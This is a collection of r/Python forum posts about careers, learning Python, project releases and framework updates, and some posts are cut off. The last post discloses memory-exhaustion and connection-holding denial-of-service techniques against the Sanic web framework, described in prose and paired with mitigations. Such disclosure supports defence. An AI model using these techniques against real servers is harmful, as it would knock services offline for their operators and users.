I had heard about the DevOps movement and though I didn't understand it completely at the time I thought that being a Developer and Systems Admin mutant sounded like a lot of fun, and something I could really be good at. 

After having a rough time with my boss one day I decided to check the local classifieds. I saw an ad for a DevOps Admin. Basically this guy needed to know hardware, networking, provisioning, something called puppet, and one of three scripting languages- ruby, bash, or python. 

I looked at puppet, and after having learned about booleans and strings and syntax from python, picking it up wasn't a problem. I got hired on the spot for $90k USD. A clean 50% raise. I use python every single day. I write scripts to check if databases back up properly, if services are up, if all 1000 of my physical servers are getting their updates, to provision RAIDs, you name it. I integrate what I write into puppet, fabric, and a host of other tools that I've learned along the way.

After doing that for a little over a year now, I'm about to hire 2 guys under me as we expand and I'm moving up to $120k USD. I'm learning django for fun and am just starting into machine learning. I check out /r/python every day, you guys have been so helpful to me along my way. And if I can learn python, anybody can!!!

TL;DR
I learned python in a year and got a 50% raise. 1 year later I got another 25% raise, all from python!

"Hello, long time lurker of this sub. I've been wanting to learn python for a long time because I've been making computer graphics with blender 3D for over 10 years. 


So a little over a year ago I decided to start teaching myself. I started with codeacadamy's python course and then worked on several small personal projects. Such as automating some stuff at work. I then did [Udacitys Intro To Programming Nanodegree.](https://www.udacity.com/course/intro-to-programming-nanodegree--nd000) I overall feel pretty confident with python now, but it's hard to gauge how good you are at something if you don't reference it with other people. So here I am to share!



So I currently work as what is probably best described as a ""security guard supervisor"" all though it is a lot more than that. I work at a charity with a low income housing complex in which all guests or staff are required to sign in and out of the building. This is necessary because of certain laws requiring it with charities(it's complicated).  And also so roll calls can be done with the staff if there is a fire alarm.


Before they simply had a binder with a pen and paper to sign in and out. I asked around and found out that we could print barcodes easily on to our ID cards. So I figured the entire process is pretty low hanging fruit for automation. So I presented my idea to my manager and then later some directors and they approved, since it was practically a free solution, aside from my time on the clock. 


I did a back of the envelope calculation and determined this program would save about 400+ man hours a year. 


**TL;DR:** So long story short even though I'm a technically a security guard they let me write python and implement this new system. Which I've had a bunch of staff thank me for because the old way was a a lot more of a pain in the ass.

"Hi guys! After a lot of hard-work and sheer determination I have mostly completed my book, ""Intermediate Python"". It will receive updates over time :)

It has a couple of issues related to grammar and technical info in it. I am working on ironing them out one by one.

I was a bit lazy so didn't upload it earlier but here it is now.

I have decided to distribute it for free! I wanted to give back to this awesome community so this is what I have to offer for now. I am sure that it would help those who really want to be helped. Best of luck! 

Here are the links:

- [GitHub](https://github.com/IntermediatePython/intermediatePython)

If you like this book then a simple [tweet](https://twitter.com/yasoobkhalid) and a personal email <yasoob DOT khld AT gmail DOT com> would mean a lot to me!

P.S: The book is open-source so if you find typo or technical error or just want to expand it's contents with your own knowledge then just send over a pull request :) Moreover, if you want to give me any tip then kindly pm me your email and I would let you know once I setup a tip-collection system.

**Note:** This is not related with that **paid** ""intermediate Python"" book in any way. I became aware of it today. I had been using this name internally for a couple of months. If the author of **paid** ""Intermediate Python"" has any issue with this I would be more than happy to change the name of my book because he definitely beated me to the finish line. :)

"I just released [cutelog](https://github.com/busimus/cutelog), a GUI for Python's standard logging module. It looks [like this](https://i.imgur.com/LQi8ccg.png).
It's cross platform and requires only minimal changes to your code (if you're already using the logging module). 

It can do most things you would expect: searching, filtering, multiple connections, customization of the output table, limiting number of records per connection, merging records of several tabs. There's also a [dark theme](https://i.imgur.com/BGUqHM2.png)!

It can also do things you would _not_ expect, because it's in beta and may have bugs. Submit an issue on GitHub if you find one of those!

"Hi there, my name is Harrison and I frequently do Python programming tutorials on [PythonProgramming.net](https://pythonprogramming.net) and [YouTube.com/sentdex](https://www.youtube.com/user/sentdex). 

I do my best to produce tutorials for beginner-intermediate programmers, mainly by making sure nothing is left to abstraction and hand waving. 

The most recent series is an in-depth machine learning course, aimed at breaking down the complex ML concepts that are typically just ""done for you"" in a hand-wavy fashion with packages and modules. 

The machine learning series is aimed at just about anyone with a basic understanding of Python programming and the willingness to learn. If you're confused about something we're doing, I can either help, or point you towards a tutorial that I've done already (I have about 1,000) to help.

The main structure for the course is to:

* Do a quick overview of the theory of each machine learning algorithm we cover.
* Show an application of that algorithm using a module, like scikit-learn, along with some real world data.
* Break down the algorithm and re-write it ourselves, **without machine learning modules**, in Python.

We're not rewriting the algorithms with the intention that we're going to actually produce something superior than what's available, but rather to learn more about how the algorithms actually work, so that we understand them better. I also see a lot of people are very keen to learn about deep-learning, but the learning curve to get to that point is quite challenging, since quite a bit of deep learning requires you to have a wholistic understanding of how things are actually working, and not just a high-level understanding of how to use a module. Hopefully this can help. 

At least for me personally, I have learned a lot by breaking the algorithms down, so I thought I would share that in my tutorials.

All tutorials are posted on **[PythonProgramming.net](https://pythonprogramming.net/machine-learning-tutorial-python-introduction/)** as well as **[YouTube](https://www.youtube.com/playlist?list=PLQVvvaa0QuDfKTOs3Keq_kaG2P55YRn5v)**, so you can follow along in video, text, or both forms, and the content is all free. 

We've done linear regression and K Nearest Neighbors so far, and have quite a long way to go still. We are going to be diving into the Support Vector Machine next, then clustering, neural networks and deep learning. Once we've made our way to deep learning, we're going to be working with TensorFlow.

If all that sounds interesting to you, come hang out and learn with us! 

I tend to release a couple videos a week. If you have suggestions/requests, feel free to share.

"I recently checked out the Python exercises from CodingBat and I think they are horrible. The exercises are targeted at beginners and so I think they should teach people the pythonic way of doing stuff. I'm no expert in Python at all but even I found so many things that are just not the way it should be done. I feel like they transferred the Java solutions to Python. To give you some examples what I mean:

 * worst thing first: They override the  str name space, by supplying str as an argument in functions or assigning some string to it.

 * Java wording: they constantly refer to lists as arrays

 * Non Pythonic solutions: when accessing the last element of a list they write array[len(o)-1], instead of array[-1]

An open source, free,  python personal assistant with a user expandable plugin framework and nlp from spaCy.io.

* Sign up: http://willbeddow.com/signup
* Web app: http://willbeddow.com 
* Github: https://github.com/ironman5366/W.I.L.L
* Android app: https://play.google.com/store/apps/details?id=com.willbeddow.will
* Telegram interface: @WillAssistantBot on telegram

**Details**:

A while back, [I posted a video](https://www.reddit.com/r/Python/comments/47jdxi/my_open_source_python_personal_assistant/) of my personal assistant - W.I.L.L. It was my first major project, and you guys gave me alot of tips and comments on what you liked, how I could improve, and the right way to do some open source stuff that I hadn't previously encountered.

After **a lot** of rewrites, extensive work (by both me, and the W.I.L.L community), I'm happy to present W.I.L.L version 3.0.

**What can W.I.L.L do?**

One of my major goals with W.I.L.L was not only to make a cool concept for a personal assistant, but to make it usable and useful. W.I.L.L. already has a number of useful plugins, and it's super easy to add more. 

**Plugins W.I.L.L already has:**

* News: ex: ""read me the news"" - a summary of the news from a site of your choice, refreshed every twelve hours
* Weather: ex: ""What's the weather like?"" - weather for your location, delivered using PyOwm
* Spotify: ex: ""Play jukebox hero on spotify"" - Searches spotify and opens a spotify url for the song that's found. On android, will open in the spotify app
* Netflix: ex: ""Watch Futurama on netflix"" - searches netflix and opens a netflix url for the shwo that's found. On android, will open in the netflix app
* Reminders: ex: ""Remind me in 10 minutes about how awesome W.I.L.L is"" - sets reminders. You can currently be notified via email and socket.io push notifications on the web app, and thanks to the expandable notification framework, it's easy to add new methods of notifying the user.
* **Search**: The crown jewel of the plugins, set to run by default when no other plugin is triggered by the input. Search runs through a chain of different search engines and sites to find the correct answer of a question. It first searches wolframalpha and wikipedia, and if it can't find anything it uses nlp from the newspaper module and bs4 to parse a correct answer from the top google result.

**Just how easy is it to add a plugin?**

    from core.plugin_handler import subscribe
    def run_check(event):
        #Check for a word in the provided spacy nlp object
        return ""example"" in [i.orth_ for i in event[""doc""]]
    
    @subscribe({""name"":""example"", ""check"": run_check})
    def example_plugin(event):
        return {""type"": ""success"", ""text"": ""example"", ""data"":{}}
    

That's it.

**Contact me**
If you have any requests for new plugins, or further comments about W.I.L.L, feel free to email me at will@willbeddow.com or leave an issue on the [Github page](https://github.com/ironman5366/W.I.L.L)

W.I.L.L is very much still in development and I could use suggestions and advice

Thanks!

"I am NOT a developer.  But, I've tinkered with programming (in BASIC, Visual Basic, Perl, now Python) when needed over the years, starting in my teens during the 80's and throughout my career, and had at least entry level courses in COBOL(in about 1990), C, and Java (in about 2009) while getting my degree.  (I was somewhat of a nontraditional student.)

Today I decided that I needed to script something, and hoped that *learning* how to do it in Python was going to take me significantly less time than doing it manually - with the benefit of future timesavings.

No, I didn't go from 0 to production in a day.  But if my coworkers will leave me alone, I *might* be in production by the end of the day tomorrow.

The last thing I used to scratch an itch like this was Perl in about 2013.  Like with Python, I was learning as I went.  And in that case - while some parts weren't bad, other parts were like running barefoot over sharp glass.  I have working Perl from back then that I still don't *quite* understand bits of, because the best I could do is take someone else's example and massage it for my needs in some places.  (In fairness, what I was doing there was a bit more complex, but it still wasn't rocket science.)

What I'm working on today isn't super complex - I'm taking some user input, making some decisions based on that input, reading a .csv, and will ultimately output a json file - but I've been able to easily understand everything I've done so far.  I've done a bit of googling around the json and csv bits, and that seems pretty easy too.  But putting together what I've done so far has just been a complete joy.

The syntax is so wonderful - it took me a couple of minutes to realize, for instance, that there was no ""wend"" or similar for a ""while"" loop, that merely the end of a code block would serve the same purpose.  But when I did I immediately thought ""wow, of course not - how efficient is that?""   I feel like that's a big part of what I'm enjoying - things that maybe should be able to be implied rather than explicitly typed in or stated, actually *are* implied in many cases.  It feels like there's a lot less in the way of required punctuation, that's for sure.

Overall it feels natural, intuitive, and relatively easy to understand and write the code for the basic things I'm doing - I haven't had this much fun doing stuff with code since the days fooling around with BASIC in my teens.

Well, thanks if you actually read this far.  I've just found this to be so fun and exciting I had to share it with folks who might care.  I think I'm going to be looking for excuses to script things with Python going forward.  :-)

"Hi guys, 

according to IEEE Spectrum, Python is the No. 1 in the ranking of the top programming languages of 2017.

Take a look [here](http://spectrum.ieee.org/static/interactive-the-top-programming-languages-2017) to see the interactive ranking.

Python has continued its upward trajectory from last year and jumped two places to the No. 1 slot.

In particular, Python is the No. 1 for Web and Enterprise categories but is not present in the top 14 positions in the Embedded category despite the constant growth of solutions such as [Zerynth](https://www.zerynth.com/) and [Micropython](http://micropython.org/).

"I'm fairly new to Python but not to Programming. With the programming languages that I've learned in the past I always see a recurring pattern — some libraries (modules) are more often used than others.


It's like the Pareto Principle (80/20 rule), which states that 80 of the outputs (or source code) will come from 20 of the inputs (language constructs/libraries).

" I was reading [this thread](https://www.reddit.com/r/programming/comments/3myc9b/insider_oracle_has_lost_interest_in_java/) on /r/Programming about how Oracle has lost interest in Java. One of the comments says
> Objective-C / Swift live on Apple island, C# lives on Microsoft island. That leaves going back to C++ or surrender oneself to the Python version schizophrenia (sounds most fun of all other options).

I started learning code with Python and I love it. I write it for fun. Now I'm having to learn Java for college and it sucks. There's so much more code to write to do simple things and you can make so many silly little syntax mistakes so easily that it makes it harder to actuallly write functioning code. A lot of people in my class are completely new to programming and they are so lost. 

I understand that because of the JVM, Java is super duper portable and a lot of existing code is written in Java. Is that the only reason it continues to be used? Would a startup or a company building something from the ground up completly avoid Java? Is Java the only language we can use for Android dev?

C++ seems to be universally hated on with C# being the best alternative but leaving you tied to a MS plaform. 

Then behind all of this there's Python. Python is a dream to read and write. Has a bunch of amazing libraries to do all kinds of cool shit. There's tools like Flask, Django, Kivy and others that allow you to use Python for WebDev and Mobile Dev. 

Even if you look at this sub there are 111,085 readers. /r/Java has 46,788 readers and /r/cpp and /r/csharp have around 30k readers. If everyone loves Python so much why is it not being used more? What am I missing here?

**EDIT:** Too many responses to reply to but thanks everyone for your input. Some good points were made about how I'm srill very new to this and will see the benefit of Java's constraints when working with other devs. Also the fact that Python just cant compete for speed in some situations. 

It seems to me that Python is an excellent tool to have on your utilitiy belt. Great for automating things and supplementing other tools (As well as being perfectly capable, most of the time, of building full size projects). However those other languages might not be that scary and have their own advantages over Python.

In my opinion though Python is an amazing educational tool. I think it could reasonable be introduced in Primary education without too much hassle while I wouldn;t say the same about Java.

"**Edit:** **[GITHUB LINK](https://github.com/brumafriend/BrumaGame)** TO CODE.  

^A ^rough ^roadmap ^can ^be ^found ^[here](https://github.com/brumafriend/BrumaGame/blob/master/Roadmap).

Made with python3, also it's a ""console game"" AKA all text.


How the game works:  
You have an army and a population, which number 5000 and 25000 respectively. Your population does not include soldiers. The aim is to conquer all 6 of the other countries there are right now: _UK, USA, France, Germany, Spain and Russia_.

You can lose in two ways. Firstly, if your population & army is so small that you can't win any war or explore to find more soldiers. Secondly, and most importantly, through **tension**:

Tension starts at 10%.  
Winning a war decreases tension.  
Losing a war increases tension.  
If tension is > 50% there is a chance there may be a civil war which can defeat you or severely damage your army and population numbers.

The mechanics:

**Conscription**: Conscription can allow you to add to an army's numbers by recruiting civilians. Your army can only get to 10,000 members through conscription and for each 1000 people conscripted, **tension** rises by 10%.

**Exploring**: You need 400 civs and 100 soldiers to explore. Exploring can result in gaining civilians and soldiers, this also decreases tension. It can also result in disaster - making you lose the people sent out and causing an increase in tension of 20%.

**War**: The most important aspect of the game is war. Waging war against another country is simple; winning is not. Your chance to win is **x/(x+y)*100**^* with x being your troops and y being the enemy's. So, if you have equal numbers then there's a 50% chance you win. Upon winning, tension is decreased and you gain troops. You can't defeat the same country twice. Upon losing, tension increases and you roughly a quarter of your troops. You can try to attack the country again at a later date.

**Money**:  Money can be used to purchase soldiers. In a desperate situation? Buy your way out of it! You start with $50,000. Winning wars earns you money, losing wars loses you money. Money can also be earned by exploring.

**Parades**: Country tension too high? Have some fun! A parade costs $10,000 but it will reset your tension to zero percent, giving you a second chance at retaining authority! A parade does not come without risk. There is a 5% chance that the parade will end in disaster, causing a 51% increase in tension (meaning a civil war is possible) and costing you an extra $10,000!

**Tax:** Low on money? Tax people. Not surprisingly, taxation isn't popular and, whilst raising funds for war, will also result in a huge increase in tension. Taxation should only really be used in emergencies or if you have a very low level of tension. For each person taxed, you gain $1. The tension increase per tax is: **(n)*0.00092** with _n_ being the number of people taxed.

**Political Belief:** (as of 01/12/2017) There are currently three political beliefs you, as a country, can adopt free of charge! You can only set your belief once (it cannot be changed), so make it count. If you become Communist, you have a higher chance to win a war. If you become Conservative, you gain less tension from defeats and failures. If you become Liberal, the chance of a civil war breaking out when your tension is above 50% is lower.

"I started learning Python, since it's an under-taught industry standard.  I know Java, C, C++ and varying knowledge of other languages...and Python...ITS BEAUTIFUL.  

As I learn the differences in structure, I feel like crying tears of joy.  Gone are the horrible days of having to meticulously define and add language-specific formats (Visual Basic makes me physically hurt sometimes).  You can even just straight-up make a list with multiple primitive types...and you don't have to write and import 3-4 different lines of code to do it.  

I know that posts like this aren't particularly interesting, but holy fuck, Python is just so cool that I can't help myself.  I feel like learning Python is as an ephiphany; it's just so efficient and effective.  

It's a shame that universities and other educational systems are so slow to embrace Python as well: from database administrators to a former executive of Sun Microsystems (Bill Raduchel), businesses want people that know Python.  However, after my brief experience, call me a convert because this is awesome.

My proposal is to add some required tags for tutorials.

"hey guys,

So I have been a subscriber of this sub for a while and even though I have been relatively inactive, I have tried to contribute the best I can esp with guys who need help with some code checking.

Well, I have been unemployed for a while now about 6 months and it hit me really hard this Christmas when I could not afford any gifts for my sister who has basically sheltered me the whole time period as i search for a job.  so this new years eve i stayed in and decided to write a small [script](https://github.com/basalamader/Job-Parser) for people like me out there who might be struggling to find a job or even may need information about the average salaries for the position they are looking for. In addition to that it also finds the median of the job you are looking for and compares it with other jobs that you may be interested in.

Requirements:

you will need a plotly account with the user name and api_key given once registered.

you wil also need to download both income and scraps.py and save them in one folder or just download the whole repo.

**Running the code**

you will need the beautiful soup package, pandas and plotly package. I believe everything else comes natively but i will include a requirements.txt file in the git repo.

[**code**](https://github.com/basalamader/Job-Parser). 

Once you have the script downloaded just format the main() at the bottom and add the list of jobs that you need to check for. Currently the default would be main([""python analyst"", ""civil engineer"", ""python""]). The state variable right before the for loop in the main module is currently ""CA"" but you can add your state.

Expected output:
you will get output like 

* [output0](""http://i.imgur.com/cGg8ajy.png"")
* [output1](""http://i.imgur.com/UsPYZFJ.png"")

it will be  a nice formatted pandas DataFrame that shows the jobs that you selected and top ten jobs displayed on the website.  Then the different levels of income with the mean and the median of every job salary.

It will also output the graph of the total number of jobs available in the list and the Quantity of jobs available (x) vs salary(y)

**Next part of the development**

I plan to parse the top 15 jobs looking for key words that can be used to buff(SEO) up your resume. In addition to this i also plan to add dice.com in the results and give the user a chance to choose between the two. I really hope you enjoy this and hopefully are able to have much better luck than I am having getting in the job market.

"I'm working on a solo project so I'm accountable to nobody. The project is just for fun so I have no financial gains from it. I license it as open source and it's available on github just for people to discover it, but I have 0 watchers and I don't ever expect to get any pull requests or anything. It's just on GitHub so I can use Jenkins CI. It's 100% my own thing and it's just for fun.

I keep doing this thing where I'll implement the functionality, then before I finish or I finish the bare minimum and I try to think about how I refactor the code to work better/to future proof it. I've been doing this over and over and over. Sometimes i implement new things, but lost of the time I'm unhappy with my code and I refactor everything.

I come from a non OOP background so my first ""release"" of my project was 100% functional, no classes at all. Then I watched some videos on better Python and I thought ""yeah ok, these 7 functions all use the same interface: let me just write a Class for it as an interface and subclass all 7 functions.""

Then I watched the ""stop writing classes"" video and thought ""oh ok, yeah these 7 classes all only do __init__ and ""evaluate"""" which is what the video says is bad class design. I liked the idea of a common shared interface though so I refactored and gave the class more functionality.

Then I realized the class was too busy, and it did things that didn't really make sense for the class. So then comes more refactoring: splitting classes etc.

Then I realized that classes aren't ""things"" but are rather ""data"", and that methods aren't ""class functions"" (noice the space), but are rather functions that act on that data (and a class **is** data). This kind of clicked and made sense, so inrefactored again.

Now all my classes are logically ""data"" objects instead of ""thing"" objects, and I have methods that act on the data and nothing more. But the problem is this left me with some functions that didn't really belong to a class, but I thought everything needed to be a class, so I refactored AGAIN and tried to fit those functions in somehow. This meant I had to change some of my ""data classes"" so that it made sense that they owned some of these new methods.

Long story short now I'm looking at my code, and remember this is all just for fun, and I'm seeing a lot of overhead. All these classes, these dependencies, etc, are all overhead when what I really need is a script to call functions. Which is what I had at the beginnig.

At this point I forked my repo and refactored AGAIN into a simple script with functions.

But I'm still not happy because now I have a ton of duplicated functions in various scripts/routines. I could refactor yet again and have a ""library"" but then I realize that these scripts can be generalized. You can see where I'm going ...

"Hey guys. Huge Python fan here, and coincidentally a lawyer. 

Python has hugely helped me out with all areas of my legal practice, and as a result, I'm one of the most efficient lawyers I know. (And that's only with some 1000 hours  of study/reading/experimentation/practical use; and I'd love to spend more hours with Python still to deeply understand every inch of its nook and cranny.)

At this point I've definitely gone beyond the basics: i.e. I have comfort with some of Python's more 'advanced' functions already (e.g. decorators, generators, etc); I've gone through or am going through most of the 'proper' Python books (e.g. Fluent Python, Beazley's Python Cookbook, etc); and I've dabbled with many areas in Python (save for the ultra-specialized ones, like machine learning, which I'm keen on taking on in time). 

Python is an amazing tool for me. 

And having read about this for a bit, I now realize that having another tool under my belt to complement Python would be great. And I may have some time on my plate for that one -- just _one_ -- more tool. (It's not that I don't appreciate the beauty of the many different programming languages, but I have to be realistic with the little time that I have.)

My question, therefore: Python is a great Swiss knife for all my main tasks, but if there was one other practical language you would recommend that I focus on and learn in depth and which could be useful for a non-programmer/lawyer, what would it be, and why?

I used celery-beat to run periodic tasks which scrape site-relevant news from sources such as RSS feeds using BeautifulSoup and requests, I used python-twitter to get relevant tweets to display on the website, and I used a couple of Django apps such as tinymce for text editing in admin site for the content creators, django-celery-beat for easily rescheduling the scheduled periodic tasks from admin site, and other apps such as humanize to format dates and times. I used nginx and gunicorn for serving the web requests and PostgreSQL as database server.

This site provides a basic blogging app with features such as dynamic categories (using post tags), scheduled posts and hidden posts, a WYSIWYG editor for content creators with support for embedding media in articles, a single-threaded comment system, and popular posts section using the article view and comments as the criteria. The app also periodically runs web scraping and other tasks using celery-beat to display upcoming tech events and tech news, and uses Twitter API to display the relevant top tweets. The tasks can easily be configured from the admin site by changing the topics to search for to obtain the news and tweets.

I will next be implementing social-auth based signing up and more advanced text searching tools for searching etc. I also keeping in mind the possibility of using ML algorithms for creating more dynamic and automated posts categories and implementing the ""related posts"" and ""suggested posts"" features down the road.

"Hi all!

Are you a hobbyist, recently graduated,  or junior dev who's looking to improve your programming? 

I'll help you out.

### Who's this guy?

I'm a senior dev / ex SysAdmin doing mostly server side and embedded development at work, most of it in Python.

### What's the catch?

Your code needs to be FLOSS and hosted on either GitHub or GitLab.  It's preferred if you _don't_ already know the tools, but have your own code that you want to figure out and improve.

### What do you Gain?

1. Git basics (workflow)  
2. Code structure & code review  
3. Documentation & work-flow  
4. Planning, ticking and breaking down tasks

### Why do you do this?

This is the stuff I've been working up material for our internal education, and I want to try it out on a group of people who self-select as interested.

### What's the requirements?

You need to have a project, that you can explain what you want to achieve.  I'll __help__ you and _teach_ you how to organize with the things around the actual coding.


### How do I sign up?

The work _will_ be in public, but all communication doesn't have to be.  Send me a notice or a private message, pitch me your project, and I'll see where we get started.


# Thank you all!

So, this exploded overnight, and I've spent quite a few hours of my workday answering questions and messages.

Those of you who signed up, great job so far.

After checking out a few project, here's going to be the plan so far, going on:

- Python packaging ( structure the code on disk)  
- commit messages ( oh my)  
- commit shaping (oh my oh my)  
- Issues and milestones   
- CI systems
- Merge Requests / Pull Requests / Code Review
- Documentation(!)


## Some numbers

25 pitches of as of yet unannounced projects, which may or may not turn into something! 

18 projects which I've started to look at, and tried to provide some level of feedback to all of them. This was a bit more intense than I thought it'd be, and my inbox exploded, so I do apologize for missing out on helping some of you.

"My goal from the beginning of this project was to create a 100% replica of the first level of Super Mario Bros using Python. I would say my version is about 90% there. At a later date I'll probably recode it to actually use a tilemap instead of my weird idea of using a background and stretching to fit an arbitrary aspect ratio. There are a few really minor features I didn't feel like adding, mostly because I'm tired of working on this project for two straight months.

To be honest, if I'd known how much work it would be to recreate Super Mario Bros, I'd have chosen a different project.  I always assumed Mario was a pretty simple game, but it's actually quite complicated. Adding powerups, enemies, updated overhead information, music and sound effects, not to mention the physics of Mario and his animations, made it quite challenging.  I hope you like it!

First of all, this is a serious post and by no means I am trying to be humorous here.

I wanted to ask you if that's also the case for you, **and** whether you can give me some suggestions for a different programming language. I'm looking for a preferably (AOT) compiled language, although my chief concern is execution speed and the expressiveness of Python. Also, a mature or at least good enough ecosystem of libraries is equally important (for GUI at least).

"If you're using Flask or Werkzeug (independently of if you're planning on upgrading to Python 3) some help is wanted in making sure that the current versions in the git repositories don't break your code (too much).

There were some unfortunate API changes necessary due to the restricted bytes type on Python 3 which might show up:

- Werkzeug's `Headers.linked`was removed without replacement.  The API just does not work without string coercion.
- Werkzeug and Flask `Headers` now returns unicode objects all the time and headers are restricted to latin1.  This is the only thing that makes sense on PEP 3333
- `werkzeug.urls` is now rewritten from scratch without the stdlib and provides URL parsing and joining functions.  Use those instead of the stdlib one if you want code that works on 2.x and 3.x.  They are internally uniforming IRIs and URIs (or at least attempt).
- Some deprecated functionality was removed in Werkzeug and Flask.
- Flask's JSON support differs from the stdlib in unicode behavior on Python 3.  Use `flask.json` instead of `json` or `simplejson` on Python 3 to get unified behavior on 2.x and 3.x regardless of if the stdlib's JSON or simplejson module is used.
- non-silent usage of limited streams in Werkzeug is gone.  I suppose nobody used that anyways.
- Werkzeug's request objects now act as context managers and provide a close method.  This ensures that request resources are properly closed without the help of the garbage collector.
- Fixed some issues with the request object sometimes ignoring the `direct_passthrough` flag.  This might show some errors in your code now.
- Flask's teardown system got reworked due to exception handling changes on Python 3.  This might now have a knock-on effect if you have custom error handlers.  You might now get an error passed to teardown functions which were previously already hidden.  This change is probably for the better due to teardown handlers being used for resource management.

To see if your app works with the changes check out the master branches from github and install them into a virtualenv.

" Fellow Scientists, what is your workflow in python?

I am a scientist/mathematician first and programmer second.

Writing code for scientific and algorithmic purposes involves looking at some data, writing something that uses said data, run some algorithms, plot the results, writing some more code that uses the data differently because you understood something from the plot.
Rewriting new and ad-hoc algorithms and when you finely like something, you put it in some special file you keep all the other functions that are useful.

This story, more or less, is what most or the scientists are facing, be it with Matlab, R, Python, or something else.

I have been using python for quite a while now and I like it, but my workflow always seemed a bit suboptimal.

This is what it looks right now:
At any given moment I have 3 windows open:

1) An IPython notebook (called Jupyter notebook now)

2) A IPython qtconsole with the same python as the notebook (this is just an ipython shell)

3) A full IDE for writing the eventual bits of code I like (PyCharm in my case)

The notebook and qtconsole are side by side. (you can lunch a qtconsole with the same kernel as the notebook with the magic command %qtconsole )
The IDE is on the second monitor.

I use the notebook to write small bits of code.
The problem with the notebook that you often need to write very small bits of code like this:

    len(arr)

putting these small fractions of code in the notebook just clutters the notebook thus making it too big to find anything.
In these cases I use the qtconsole (remember, it is connected to the same python kernel so anything you do in the notebook you can also access in the qtconsole)

To write big functions or classes I use pycharm and do

    %run /path/to/script/in/pycharm

to run it in the notebook.

All this is very convoluted, the notebook itself while super nice, isn't very configurable, for example I like much more the cell idea in matlab, where you can run cells and the output is in the shell.

What I tested and didn't like at the end:
1) Spyder - this is the obvious candidate, but it has one major flow, the auto-complete in the the editor is not connected to the python kernel, so even something like this has no autocomplete (in the editor)

    from numpy import *
    a = zeros(10)
    a.<tab>            # this would get autocompleted in the notebook but not in spyder

2) using the Pycharm built in notebook support - it is just super buggy at the moment (and has the same problem as spyder)

3)  sublime with sublimeREPL - this is not even close to the notebook capabilities.

4) JupyterLab - this is in alpha and buggy now

"I was doing some of the warmup exercises at coding.bat, and saw an example of a better way to write in Python. It's nothing much, but it made me realize that I have a basic understanding of what I'm doing now. 

Basically I figured out why this:

        if a_smile == b_smile:
            return(True)
        if a_smile != b_smile:

Can be written much more efficiently as this:

"After a previous post on [reddit](https://www.reddit.com/r/Python/comments/384tcu/finally_it_is_now_easy_to_send_emails_in_python/), [yagmail](https://github.com/kootenpv/yagmail)'s back!

There will be a detailed description in the README on [github](https://github.com/kootenpv/yagmail), but here I'll list some features:

- Python 2 & 3
- Simple wrapper on SMTP, with some magic
- Easy to send attachments
- Easy to embed images / html
- And by easy I mean really easy: just point to a local file path or write some html; yagmail will attach/use it!
- No more passwords in scripts

Since the last post:

- Emails are now automatically HTML, with logical fallback texts for non HTML email viewers
- Explicitly send raw text (method `raw`)
- Explicitly embed an image inline (method `inline`)
- Passwordless script extended by `getpass` fallback
- 5 reddit suggestions followed, 6 github issues closed
- Lots of bugfixes

Code to get started:

    from yagmail import SMTP, inline
    yag = SMTP('mygmailusername')
    contents = ['This is the body, and here is an image:', inline('/local/path/img.png'),
                'You can also find an audio file attached.', '/local/path/song.mp3']
    yag.send('to@someone.com', 'subject', contents)

Note that when `contents` is a list, it will consider each item and check if it is a local file. If it is, it will attach it with the right MIME type. Awesome!

Do note that I'm the maintainer, but I'm posting this because I'm committed to making it a great package for people who want to easily send email messages (rather than 20 lines of SMTP/MIME).

I'm also committed to try and resolve all issues within 24 hours on github. Please raise an issue at github, or send me an email using `yag.feedback(message = 'Great job dude!')`

Note that I'm preparing for a first version, and will gladly use all feedback I get :)

"Performance of Sanic-based web servers is pretty good, sure.

The only problem is that people want not only fast but stable servers.

From this perspective the Sanic is awful.

Malicious software can crash any Sanic server easy by out-of-memory error.

Let me analyze several different attack vectors:

1. Send a POST to any (even not existing) PATH.

   Push ""Content-Length"" HTTP header with the maximum available value
   without sending a body.

   You should discover what is a maximum allowed size for POST HTTP
   body.  Sanic by default limiting it down to insane 100 megabytes
   but Reverse Proxy Server like NGINX may reduce it to more
   reasonable 1 MB for example. Even 1 MB is enough.

   Now we have 2 options: 

   a. Without closing the connection open as many concurrent
      connections as you can and push all of them into the state when
      HTTP headers are sent but HTTP body transition is postponed.
      Pretty classic attack for locking all TCP ports on a server by
      opened idle connections.

      Sanic will drop the connection after 60 seconds by default but 
      a minute may be enough for pushing the server into Deny-Of-Service
      state. The problem is not specific to Sanic, consequences are
      relative innocent.

   b. The more interesting case is sending *almost whole BODY* but without
      a couple bytes at the end.

      In fact, Sanic performs a routing and request handling only after
      fetching the whole BODY.

      It means that BODY is COLLECTED IN MEMORY before starting of
      PATH/HEADERS analyzing and processing.  You can declare 100 MB
      request's BODY, send 99 MB of garbage random data and stop
      sending after that.

      Open another concurrent request and do the same. Repeat multiple
      times. Most likely the server will run out of memory *before*
      getting run out of free ports.

      Why out-of-memory error is more harmful than free-ports
      problem?  Because of it, not only web process(es) stops
      processing incoming requests but the whole server goes to
      unresponsible state: physical memory is out, everything becomes
      swapped to disk, CPU is overheated by kernel swapper worker, as
      the result even connecting to a problematic server by SSH becomes
      deadly slow.

      The problem can be reduced by adding monitoring tools for
      looking at Sanic processes memory and killing problematic web
      workers. But default configuration has no such monitors.

      I bet that most web servers in the world are not configured
      properly (at least very many of them).  Also killing a web
      process is a painful procedure, sometimes is not easy to
      distinguish normal occasional high memory consumption from
      malicious attack. As result, normal processing of user data will
      be killed.

2. Use Sanic streaming.

   Sanic has Response Streaming feature.  It is widely used to
   download big data, video streaming etc.

   Assume you know that https://server.com/video is a resource name
   for video stream powered by Sanic.

   How to screw it up?  Really very easy.

   Connect to the server by regular GET https://server.com/video and
   read body SLOWLY.

   Sanic has no Flow Control for streaming data (in fact it has no
   flow control at all).  Data is sent to a peer when the next data chunk
   is available.  If TCP socket's Write Buffer is overloaded -- the
   data is pushed into process memory.  If HTTP peer (browser or
   another client) consumes stream slower than Sanic produces it --
   Sanic process will end up with out-of-memory eventually.

   The problem is very dramatic because it doesn't need a malicious
   software to reproduce -- just slow network connection between
   client and server is enough to explode the bomb.

   As result, a streaming in Sanic is broken by design, the feature
   usage is very dangerous even if nobody wants to knock out your
   server -- it will be demolished by an innocent client with slow
   network.

What to do?

Unfortunately, problems described above are architectural problems of
Sanic framework, they cannot be solved on the user side.

Moreover, fixing is not possible without changing Sanic public API.

Good news: Sanic development team runs so fast that new backward
incompatible changes can land into master without any deprecation
period and related procedures. They did it several times, the project is
still in beta stage.

The only real protection can be done Right Now is *limiting a memory
acquired by Sanic process*. Better to kill an eager process than allow
it to grab all memory with dying not only the Sanic process but the whole
server.

Graceful restart could be very complicated but even rough
""kill -9"" is better than nothing.

